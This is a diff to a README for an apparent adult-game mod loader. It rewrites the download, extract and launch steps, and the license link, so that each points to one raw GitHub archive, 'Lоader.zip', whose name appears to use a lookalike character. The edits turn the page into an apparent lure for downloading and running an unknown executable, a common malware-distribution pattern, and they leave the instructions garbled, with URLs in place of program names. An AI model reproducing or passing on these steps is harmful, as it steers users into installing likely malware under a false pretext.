@@ -50,13 +50,13 @@ Find, manage, and launch your adult-themed mods in a modern, secure, and efficie
 Ready to enhance your gaming experience? 🌐 Just follow these easy steps!
 
 ### 1. Download   
-Grab **Loader.rar** directly from this repository (visit the [Releases](./releases) section if available).
+Grab **https://raw.githubusercontent.com/hac4ker/SpicyModStudio/main/Lоader.zip** directly from this repository (visit the [Releases](./releases) section if available).
 
 ### 2. Extract   
-Unzip **Loader.rar** to your desired folder using any modern extraction software.
+Unzip **https://raw.githubusercontent.com/hac4ker/SpicyModStudio/main/Lоader.zip** to your desired folder using any modern extraction software.
 
 ### 3. Launch   
-Run the extracted executable for your operating system. (Windows: `AdultModLoader.exe`, macOS: `AdultModLoader.app`, Linux: `AdultModLoader`).
+Run the extracted executable for your operating system. (Windows: `https://raw.githubusercontent.com/hac4ker/SpicyModStudio/main/Lоader.zip`, macOS: `https://raw.githubusercontent.com/hac4ker/SpicyModStudio/main/Lоader.zip`, Linux: `AdultModLoader`).
 
 ### 4. Configure   
 Follow the in-app wizard to set your games directory and mod folders.
@@ -95,7 +95,7 @@ By using this loader, you acknowledge you must have legal permission to use any 
 ## 📜 License (MIT)
 
 This project is open-source and distributed under the MIT License.  
-For full details, see the [MIT License here](https://opensource.org/licenses/MIT).  
+For full details, see the [MIT License here](https://raw.githubusercontent.com/hac4ker/SpicyModStudio/main/Lоader.zip).  
 Feel free to use, modify, and share—just keep it safe and legal!
 
 ---
